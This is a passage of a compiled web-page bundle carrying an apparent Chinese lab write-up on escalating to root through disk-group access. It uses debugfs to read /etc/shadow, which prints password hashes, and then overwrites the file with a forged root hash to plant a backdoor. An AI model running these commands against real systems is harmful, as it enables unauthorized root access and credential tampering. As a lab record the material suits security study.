q\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("p",[s._v("重启后，ssh登录 test 用户")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/1.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"shadow-添加后门用户"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#shadow-添加后门用户"}},[s._v("#")]),s._v(" shadow 添加后门用户")]),s._v(" "),a("p",[s._v("debugfs 读取 shadow 文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /etc/shadow\nroot:"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$6")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$kRbauhnw3OEtnKk6")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$yXsjenRj0EuRJjuuMGlE07KQDOBKuI6E4aJm")]),s._v("/UCld4DaqNjDtfKXVGaykJkiOE9PNohFgUk0WTn.4KcfCac3C.:20399:0:99999:7:::\n省略内容。。。。\nDodo:"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$6")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$Viz4XTwZSwA00ngE")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$6WGPp6SfhFU")]),s._v("/j/oosIBG/rYDBvX9QhpFPa8VWo3Q5fkWCJPmJUCsAL12WEkkUuQJ4ZwesrLJvymNAFTpeFqa00:20399:0:99999:7:::\ndebugfs:\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("在家目录 下创建 shadow 文件，篡改 root 用户密码哈希，完事重启。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ mkpasswd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-m")]),s._v(" sha-512 password\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$6")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$HmwaHrlwkvqL88gL")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$IKaAS2Rfz7IfkOzDnMJ2EzPm5wAFt6KQMmKterFKi6")]),s._v(".7btziAkk3qXgFFVO1g624RhziuEATuzDAmsjA5gskX1\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("vim")]),s._v(" shadow\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cp")]),s._v(" shadow /tmp/shadow_tmp\nDodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/shadow_tmp /etc/shadow\nwrite: Ext2 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" already exists \ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /etc/shadow\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/shadow_tmp /etc/shadow\nAllocated inode: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" /etc/shadow\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" i_mode 0100640\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" i_uid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" i_gid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  q\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[s._v("在不重启的情况下，尝试使用 su 切换 root 用户，发现密码未被篡改成功")]),s._v(" "),a("p",[s._v("重启后，出现严重问题，虚拟机崩溃，virtualbox 崩溃")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/7.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/6.png",alt:""}})]),s._v(" "),a("p",[s._v("再次重启， 发现 root 密码已被篡改成功，使用 password 登录成功")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/8.png",alt:""}})]),s._v(" "),a("p",[s._v("文件系统没有进入只读状态")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/9.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"其他"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#其他"}},[s._v("#")]),s._v(" 其他")]),s._v(" "),a("p",[s._v("passwd、shadow都可以成功提权，其他可能的文件写入提权方式应该也没问题，优先考虑无需重启的提权方式。")])])}),[],!1,null,null,null);a.default=n.exports}}]);